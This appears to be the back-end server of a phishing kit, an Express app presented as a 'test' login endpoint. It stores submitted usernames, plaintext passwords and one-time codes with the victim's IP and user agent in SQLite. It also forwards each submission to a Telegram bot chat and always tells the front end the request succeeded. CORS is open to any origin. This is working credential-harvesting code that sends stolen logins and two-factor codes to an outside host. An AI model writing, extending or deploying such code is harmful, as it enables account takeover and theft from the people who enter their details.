import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import cors from "cors";
import dotenv from "dotenv";
import path from "path";

// Load environment variables
dotenv.config();

// Initialize Database
const db = new Database("dev_logs.db");
db.exec(`
  CREATE TABLE IF NOT EXISTS form_submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    identifier TEXT,
    password TEXT,
    otp TEXT,
    ip_address TEXT,
    user_agent TEXT
  )
`);

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  // Middleware
  const allowedOrigin = process.env.ALLOWED_ORIGIN || "*";
  app.use(cors({
    origin: allowedOrigin,
    methods: ["POST", "GET"],
    credentials: true
  }));
  app.use(express.json());

  // 3. Test Endpoint: Receives and logs form submissions
  app.post("/api/login", async (req, res) => {
    const { identifier, password, otp } = req.body;
    const timestamp = new Date().toISOString();
    const ip_address = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    const user_agent = req.headers['user-agent'] || 'unknown';

    try {
      // 1. SQLite Persistence
      const insert = db.prepare(`
        INSERT INTO form_submissions (timestamp, identifier, password, otp, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
      `);
      insert.run(timestamp, identifier, password, otp || 'N/A', String(ip_address), user_agent);

      console.log("--- DATA PERSISTED TO SQLITE ---");

      // 2. Telegram Webhook Notification
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      if (botToken && chatId) {
        const message = `📱 *NEW LOGIN TEST*\n\n` +
                        `👤 *ID:* \`${identifier}\`\n` +
                        `🔑 *Pass:* \`${password}\`\n` +
                        `🔢 *OTP:* \`${otp || 'N/A'}\`\n` +
                        `🌐 *IP:* \`${ip_address}\`\n` +
                        `🕐 _${timestamp}_`;

        // Send to Telegram (non-blocking)
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        }).catch(err => console.error("Telegram Notification Error:", err));
      } else {
        console.log("Telegram config missing, skipping notification.");
      }

    } catch (error) {
      // 5. Don't let errors bubble to client
      console.error("Server Processing Error:", error);
    }

    // Still return success so front-end continues working
    res.json({ 
      success: true, 
      message: "Server processed data successfully!",
      receivedAt: timestamp 
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  }

  app.listen(Number(PORT), "0.0.0.0", () => {
    console.log(`Backend server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
